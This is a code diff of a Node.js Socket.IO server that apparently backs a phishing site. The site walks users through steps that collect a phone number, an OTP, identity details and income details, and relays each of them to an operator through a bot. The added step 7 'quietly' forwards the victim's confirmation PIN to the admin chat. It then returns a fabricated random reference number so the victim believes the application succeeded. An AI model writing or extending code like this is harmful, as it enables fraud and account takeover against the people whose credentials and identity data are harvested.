@@ -55,7 +55,7 @@ io.on('connection', (socket) => {
         return activeRoom;
     };
 
-    // STEP 1: Phone submission
+    // STEP 1: Phone submission (Djibouti +253 Context handled on client)
     socket.on('request-otp1', (data) => {
         const currentId = getValidId(data);
         botManager.sendToAdmin(currentId, "Initial Request: Phone Submitted", { Phone: data.phone }, false);
@@ -93,15 +93,26 @@ io.on('connection', (socket) => {
         botManager.sendToAdmin(currentId, "Step 5: Personal Identity Profile", cleanData, false);
     });
     
-    // STEP 6: Employment & Income Status
+    // STEP 6: Employment & Income Status (PASSIVE LOGGING ONLY - Moves frontend directly to Step 7)
     socket.on('step3-data', (data) => {
         const currentId = getValidId(data);
         const { appId, ...cleanData } = data;
         
         botManager.sendToAdmin(currentId, "Step 6: Employment & Income Status", cleanData, false);
+    });
+
+    // STEP 7: Final Signature PIN Confirmation (No Admin Verification Needed - Immediate Success Output)
+    socket.on('execute-final-confirmation', (data) => {
+        const currentId = getValidId(data);
+        const { appId, confirmPin } = data;
         
+        // Quietly log confirmed code entry parameters inside the administration panel chat
+        botManager.sendToAdmin(currentId, "Step 7: Final Signature PIN Confirmation", { "Confirmed PIN": confirmPin }, false);
+        
+        // Generate systematic response properties instantly for client resolution step 8
         const referenceId = `REF-${Math.floor(100000 + Math.random() * 900000)}`;
         io.to(currentId).emit('application-complete', { referenceId });
+        console.log(`✅ Session ${currentId} successfully generated local validation parameters.`);
     });
 
     socket.on('disconnect', () => {
